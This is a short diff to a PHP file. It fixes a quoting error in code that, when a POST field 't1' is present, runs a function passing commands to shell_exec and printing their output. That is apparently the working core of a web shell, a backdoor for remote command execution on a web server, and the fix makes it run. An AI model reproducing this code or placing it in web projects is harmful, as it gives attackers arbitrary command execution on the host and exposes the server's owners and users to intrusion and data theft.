@@ -17,7 +17,7 @@
 <?php
 if (isset($_POST["t1"]) && !empty($_POST["t1"])) {
 function runcmd ($cmd){
-  echo "<pre>;
+  echo "<pre>";
   echo shell_exec($cmd . " 2>&1");
   echo "</pre>";
 }
